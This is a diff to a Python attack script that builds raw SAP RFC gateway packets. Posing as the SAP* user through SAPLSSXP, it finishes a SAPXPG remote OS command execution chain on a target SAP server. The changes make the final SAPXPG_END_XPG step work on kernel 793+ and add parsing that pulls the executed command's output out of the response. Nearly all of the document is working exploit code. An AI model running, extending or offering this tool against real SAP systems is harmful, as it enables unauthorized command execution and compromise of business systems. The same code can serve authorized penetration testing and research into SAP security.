@@ -599,68 +599,89 @@ def build_saprfxpg_end():
     return x
 
 
-def build_sapcpicparam_p4(flag=2):
-    """Build SAPCPICPARAM for P4 (END_XPG) with fixed mask/ip values."""
-    p = b""
-    p += b"\x01\x00\x0c\x29"                    # pref (4 bytes)
-    p += b"\x00\x99\xd0\x1e"                    # param1 (4 bytes)
-    p += b"\xe3\xa0\xba\x9a\xec\xea\x55\x80\x0a\x4e\xd5"  # param2 (11 bytes)
-    p += b"\x81\xe3"                             # param_sess_1 (2 bytes)
-    p += b"\x09\xf6\xf1\x18"                    # param_sess_2 (4 bytes)
-    p += ip_to_bytes("160.10.0.12")              # mask (4 bytes)
-    p += ip_to_bytes("41.0.153.208")             # ip (4 bytes)
-    p += struct.pack("!I", flag)                 # flag (4 bytes)
-    return p
+def build_sapcpic_end(target_ip, hostname, sid, instance, kernel, dest, client):
+    """Build full SAPCPIC structure for SAPXPG_END_XPG.
 
+    Uses the same full format as P3 (with TH struct and metadata TLVs)
+    but with the SAPXPG_END_XPG function name and END payload.
+    Kernel 793+ requires this full format; the shorter SAPCPIC2 format
+    returns RFC_NOT_FOUND on newer kernels.
+    """
+    host_sid_inbr = "%s_%s_%s" % (hostname, sid, instance)
 
-def build_sapcpic2(kernel, target_ip):
-    """Build SAPCPIC2 structure for SAPXPG_END_XPG (shorter packet, no TH struct)."""
-    cpic_param_data = build_sapcpicparam_p4(flag=2)  # flag=2, different mask/ip for END
+    th = build_saprfc_th_struct(sid, hostname, instance, target_ip)
+    cpic_param_data = build_sapcpicparam(target_ip, flag=2)
     cpic_param2_data = build_sapcpicparam2()
     xpg_end = build_saprfxpg_end()
     suffix = build_sapcpic_suffix(kernel)
 
     c = b""
-    # SAPCPIC2 starts at cpic_padd015_1 (no metadata TLVs before it)
-    c += b"\x01\x36"                                                       # cpic_padd015_1
-    c += struct.pack("!H", len(cpic_param_data)) + cpic_param_data         # some_cpic_params
+    c += b"\x01\x01\x00\x08"
+    c += struct.pack("!H", 257)
+    c += b"\x01\x01\x01\x01"
+    c += struct.pack("!H", 0)
+    c += b"\x01\x01\x01\x03"
+    c += struct.pack("!H", 4) + b"\x00\x00\x06\x1b"
+    c += b"\x01\x03\x01\x06"
+    c += struct.pack("!H", 11) + b"\x04\x01\x00\x03\x01\x03\x02\x00\x00\x00\x23"
 
-    c += b"\x01\x36\x05\x02"                                              # cpic_padd016
-    c += struct.pack("!H", 0)                                              # cpic_convid_label (empty)
+    c += build_tlv(b"\x01\x06\x00\x07", pad_right(target_ip, 15, b" "))
+    c += build_tlv(b"\x00\x07\x00\x18", target_ip.encode("ascii"))
+    c += build_tlv(b"\x00\x18\x00\x08", host_sid_inbr.encode("ascii"))
+    c += build_tlv(b"\x00\x08\x00\x11", b"3")
+    c += build_tlv(b"\x00\x11\x00\x13", (kernel + " ").encode("ascii"))
+    c += build_tlv(b"\x00\x13\x00\x12", (kernel + " ").encode("ascii"))
+    c += build_tlv(b"\x00\x12\x00\x06", dest.encode("ascii"))
+    c += build_tlv(b"\x00\x06\x01\x30", b"SAPLSSXP")
+    c += build_tlv(b"\x01\x30\x01\x11", b"SAP*")
+    c += build_tlv(b"\x01\x11\x01\x14", client.encode("ascii"))
+    c += build_tlv(b"\x01\x14\x01\x15", b"E")
+    c += build_tlv(b"\x01\x15\x00\x09", b"SAP*")
+    c += build_tlv(b"\x00\x09\x01\x34", client.encode("ascii"))
+    c += build_tlv(b"\x01\x34\x05\x01", b"\x01")
 
-    c += build_tlv(b"\x05\x02\x00\x0b", kernel.encode("ascii"))           # cpic_kernel3
-    c += build_tlv(b"\x00\x0b\x01\x02", b"SAPXPG_END_XPG")               # cpic_RFC_f
+    c += b"\x05\x01\x01\x36"
+    c += struct.pack("!H", len(cpic_param_data)) + cpic_param_data
 
-    c += b"\x01\x02\x05\x03"                                              # cpic_padd019
-    c += struct.pack("!H", 0)                                              # cpic_unk4 (empty)
+    c += b"\x01\x36\x05\x02"
+    c += struct.pack("!H", 0)
 
-    # No TH struct in P4; skip directly to cpic_padd021
-    # In SAPCPIC2, cpic_padd021 = '\x05\x03\x05\x14' (different from SAPCPIC)
-    c += b"\x05\x03\x05\x14"                                              # cpic_padd021
-    c += struct.pack("!H", len(cpic_param2_data)) + cpic_param2_data       # some_cpic_params2
+    c += build_tlv(b"\x05\x02\x00\x0b", kernel.encode("ascii"))
+    c += build_tlv(b"\x00\x0b\x01\x02", b"SAPXPG_END_XPG")
 
-    c += build_tlv(b"\x05\x14\x04\x20", b"\x00\x00\x00\x00")             # cpic_unk6
-    c += b"\x04\x20\x05\x12"                                              # cpic_padd023
-    c += struct.pack("!H", 0)                                              # cpic_unk7 (empty)
+    c += b"\x01\x02\x05\x03"
+    c += struct.pack("!H", 0)
 
-    # XPG END payload
+    c += b"\x05\x03\x01\x31"
+    c += struct.pack("!H", len(th)) + th
+
+    c += b"\x01\x31\x05\x14"
+    c += struct.pack("!H", len(cpic_param2_data)) + cpic_param2_data
+
+    c += build_tlv(b"\x05\x14\x04\x20", b"\x00\x00\x00\x00")
+    c += b"\x04\x20\x05\x12"
+    c += struct.pack("!H", 0)
+
     c += xpg_end
 
-    # Suffix
-    c += b"\x03\x02\x01\x04"                                              # cpic_padd024
+    c += b"\x03\x02\x01\x04"
     c += struct.pack("!H", len(suffix)) + suffix
 
-    c += b"\x01\x04\xff\xff"                                              # cpic_end_padd
-    c += struct.pack("!H", 0)                                              # cpic_end
+    c += b"\x01\x04\xff\xff"
+    c += struct.pack("!H", 0)
 
-    c += b"\xff\xff\x00\x00"                                              # cpic_end_sig
+    c += b"\xff\xff\x00\x00"
 
     return c
 
 
-def build_p4(conv_id, kernel, target_ip):
-    """Build F_SAP_SEND packet with SAPXPG_END_XPG."""
-    cpic2 = build_sapcpic2(kernel, target_ip)
+def build_p4(conv_id, target_ip, hostname, sid, instance, kernel, dest="T_75", client="000"):
+    """Build F_SAP_SEND packet with SAPXPG_END_XPG.
+
+    Uses the full SAPCPIC format (with TH struct and metadata TLVs)
+    which works on both older and newer (793+) SAP kernels.
+    """
+    cpic_end = build_sapcpic_end(target_ip, hostname, sid, instance, kernel, dest, client)
 
     header = build_saprfc_header_v6(
         func_type=0xCB,         # F_SAP_SEND = 203
@@ -677,11 +698,59 @@ def build_p4(conv_id, kernel, target_ip):
 
     cm_ok = b"\x00" * 31 + b"\x02"
 
-    p = header + cm_ok + cpic2
-    p += struct.pack("!H", len(cpic2))   # cpic_packet_size
-    p += struct.pack("!I", 28000)        # rfc_packet_size
+    p = header + cm_ok + cpic_end
+    p += struct.pack("!H", len(cpic_end))   # cpic_packet_size
+    p += struct.pack("!I", 28000)           # rfc_packet_size
 
     return p
+
+
+def extract_p4_output(data):
+    """Extract command output from a P4 (SAPXPG_END_XPG) response.
+
+    Handles two formats:
+    - Old kernels (<793): output lines are TLV-encoded as 03 04 03 04 00 <len> <data>
+    - New kernels (793+): output is a single space-padded block in 03 02 03 03 TLV
+
+    Returns a list of output lines (strings).
+    """
+    lines = []
+
+    # Skip RFC header (48 bytes) + cm_ok (32 bytes) = 80 bytes
+    search_start = 80
+
+    i = search_start
+    while i < len(data) - 6:
+        # Check for TLV output line: XX XX 03 04 00 <len> <data>
+        # First line uses 03 02 03 04, subsequent lines use 03 04 03 04
+        if (data[i:i+4] == b"\x03\x04\x03\x04"
+                or data[i:i+4] == b"\x03\x02\x03\x04"):
+            line_len = struct.unpack("!H", data[i+4:i+6])[0]
+            if line_len > 0 and i + 6 + line_len <= len(data):
+                raw = data[i+6:i+6+line_len]
+                # Strip trailing \r \x20 (CR + space used as line endings)
+                text = raw.decode("ascii", errors="ignore").rstrip("\r\n \x00")
+                if text:
+                    lines.append(text)
+                i += 6 + line_len
+                continue
+        # Check for padded block: 03 02 03 03 00 <len> <padded_data>
+        # (new kernels: output is a single space-padded block)
+        elif data[i:i+4] == b"\x03\x02\x03\x03":
+            block_len = struct.unpack("!H", data[i+4:i+6])[0]
+            if block_len > 0 and i + 6 + block_len <= len(data):
+                raw = data[i+6:i+6+block_len]
+                text = raw.decode("ascii", errors="ignore").rstrip(" \x00\r\n")
+                if text:
+                    for line in text.split("\n"):
+                        line = line.rstrip("\r ")
+                        if line:
+                            lines.append(line)
+                i += 6 + block_len
+                continue
+        i += 1
+
+    return lines
 
 
 # ---------------------------------------------------------------------------
@@ -763,19 +832,31 @@ def parse_response(data, step_name=""):
             break
 
     # Extract STRTSTAT value if present
-    # Look for single-char status after STRTSTAT-related data
-    # In the response, look for the status byte pattern
-    idx = data.find(b"STRTSTAT")
+    # Try ASCII first, then UTF-16LE (kernel 793+ returns UTF-16LE)
+    strtstat_ascii = b"STRTSTAT"
+    strtstat_utf16 = "STRTSTAT".encode("utf-16-le")  # S\x00T\x00R\x00...
+
+    idx = data.find(strtstat_ascii)
     if idx >= 0:
-        # Status is typically a single char some bytes after the label
-        # Search for it in a reasonable window
+        # ASCII: status is a single char some bytes after the label
         window = data[idx:idx + 50]
         for i in range(len(window)):
             ch = window[i]
             if ch in (ord('O'), ord('F'), ord('E')):
-                # O=OK, F=Failed, E=Error
                 info["strtstat"] = chr(ch)
                 break
+    else:
+        # Try UTF-16LE encoded STRTSTAT
+        idx = data.find(strtstat_utf16)
+        if idx >= 0:
+            # Status value is also UTF-16LE encoded (e.g. O\x00)
+            # Skip past the STRTSTAT label + TLV overhead to find it
+            window = data[idx + len(strtstat_utf16):idx + len(strtstat_utf16) + 30]
+            for i in range(0, len(window) - 1, 2):
+                lo, hi = window[i], window[i + 1]
+                if hi == 0 and lo in (ord('O'), ord('F'), ord('E')):
+                    info["strtstat"] = chr(lo)
+                    break
 
     return info
 
@@ -938,7 +1019,8 @@ def main():
     # Step 4: SAPXPG_END_XPG (optional)
     if not args.skip_end_xpg:
         print("\n[*] Step 4: SAPXPG_END_XPG (retrieving output)")
-        p4_data = build_p4(conv_id, args.kernel, args.host)
+        p4_data = build_p4(conv_id, args.host, args.hostname, args.sid,
+                           args.instance, args.kernel, args.dest, args.client)
         ni_send(sock, p4_data)
         try:
             resp = ni_recv(sock, args.timeout)
@@ -949,14 +1031,16 @@ def main():
             info = parse_response(resp, "SAPXPG_END_XPG")
             if info["error"]:
                 print("[-] END_XPG error: %s" % info["error_msg"])
-                print("[*] This is expected on kernel 793+. Use --skip-end-xpg")
             else:
-                print("[+] Output:")
-                for s in extract_ascii_strings(resp, 2):
-                    print("    %s" % s)
+                output_lines = extract_p4_output(resp)
+                if output_lines:
+                    print("[+] Command output:")
+                    for line in output_lines:
+                        print("    %s" % line)
+                else:
+                    print("[*] No output captured (command may have no stdout)")
         except (socket.timeout, ConnectionError) as e:
             print("[-] END_XPG timeout/error: %s" % e)
-            print("[*] Use --skip-end-xpg on kernel 793+")
     else:
         print("\n[*] Skipping SAPXPG_END_XPG (--skip-end-xpg)")
 
